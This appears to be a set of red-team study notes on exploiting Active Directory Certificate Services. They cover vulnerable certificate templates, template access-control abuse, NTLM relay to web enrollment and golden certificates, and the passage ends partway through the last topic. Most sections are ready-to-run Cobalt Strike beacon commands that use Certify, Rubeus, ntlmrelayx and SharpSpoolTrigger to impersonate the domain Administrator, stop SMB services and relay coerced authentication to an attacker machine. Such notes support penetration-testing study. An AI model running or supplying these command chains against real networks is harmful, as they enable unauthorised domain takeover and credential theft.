active directory certificate services (ADCS) is used for issuing and managing PKI certificates
we can use misconfigurations in ADCS to escalate priviliges and achieve persistence

enumeration using certify
    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --quiet
    this will return information about CA and sub-CAs in the domain, along with their potential vulnerabilities

1. misconfigured 'client authentication' template:
    priv esc vuln that occurs when an attacker can enroll for a cert that has an EKU that enables client authentication
    and where subject info can be supplied by the requester
    enumeration for this vuln:
        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
            we're looking for the ENROLLEE_SUPPLIES_SUBJECT flag, client auth in the extended key usage (EKU)
            be sure to note the template name and publishing CAs here
    exploitation:
        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
            where...
                --ca is the target CA for the cert req (publishing CAs)
                --template is the cert template to request (template name)
                --upn is the user we want to impersonate, aka subjet alternate name for the cert req
        this will produce a base64 encoded cert in PFX format, which can use with asktgt
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[cert] /enctype:aes256 /nowrap
        this will produce a service ticket!

2. misconfigured 'certificate request agent' template:
    priv esc vuln that occurs when an attacker can enroll for a cert that has the certificate request agent EKU enabled
    these can be used to sign cert reqs on behalf of others, allowing for impersonation
    enumeration:
        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
            we're looking for 'Certificate Request Agent' EKU
    exploitation:
        request a cert from this template using current user
            beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
        then request a cert on behalf of another user
            beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx [cert] --quiet

3. misconfigured 'any purpose' template:
    priv esc vuln that occurs when an attacker can enroll for a cert that has the 'Any Purpose' or blank EKU 
    we can use this for any purpose, so we can follow steps in #2 or #1 if we have ENROLEE_SUPPLIES_SUBJECT

4. certificate template access control
    priv esc vuln that occurs when there's an overly permissive ACE on a template allowing us to modify it
    permissions of interest:
        owner: implicit full control
        fullcontrol: explicit full control
        writeowner: generic write on the template 
        writeproperty: can change the owner
        writedacl: can change the access controls of the template
    enumeration:
        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
            looking for any permissions of interest
    exploitation:
        if we have write permissions...
            grant yourself enrollment rights using --enroll [SID]
            toggle manager approval using --manager-approval, and set signatures needed to 0 using --authorized-signature 0
            toggle EKUs that allow client authentication, --client-auth, --pkinit-auth, or --smartcard-login
            toggle the ENROLLEE_SUPPLIES_SUBJECT flag using --supply-subject
                ex. beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
        now we can mimic the attack #1
    
5. NTLM relay to ADCS HTTP Endpoints
    CAs can be configured with web enrollment services that allows users to request certs via the web
    if not hosted over HTTPS with channel binding, the endpoints are vulnerable to NTLM relaying
    this endpoint is typically located at http[s]://<ca>/certsrv
    enumeration:
        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
            looking for support for HTTP web enrollment without channel binding
    exploitation:
        relaying over a C2 is complex as we don't have easy control of port 445
        to achieve relaying with C2 we must...
            unbind port 445 on compromised machine
            NOTE: unbinding port 445 will break every SMB service (incl. smb beacons!), so be careful! do not do this on a machine where smb is critical
                verify that 445 is in use
                    beacon> netstat
                stop the process lanmanserver, srv2, then srvnet
                    reconfigure lanmanserver so it doesn't restart automatically
                        beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
                    now stop each service
                        beacon> sc_stop lanmanserver
                        beacon> sc_stop srv2
                        beacon> sc_stop srvnet
            start a reverse port forward on 445 to tunnel incoming NTLM auth reqs to our attacker machine
                set up a reverse port forward to our local machine on port 7445
                NOTE: inbound traffic on 445 may be blocked, we can temporarily create a firewall rule to allow it if needed
                    beacon> rportfwd_local 445 localhost 7445
            run a socks proxy for ntlmrelayx to forward the reqs back to the ADCS HTTP endpoint
                beacon> socks 1080 socks5
            run ntlmrelayx on our attacker machine to catch the NTLM reqs
                └─# proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
            now we just need to coerce authentication
                beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
            once the ntlm req tunnels to ntlmrelayx, it will relay it back through socks proxy to request the cert, download it, and save in PFX format
            this cert can be used to obtain a TGT, then we can perform a S42Uself to obtain service tickets

6. golden certificates
    technique to extend privileged access to a CA server into unrestricted privileged across the entire domain
    if a CA server is compromised, we can extract the public and private keys used to sign and issue certs
    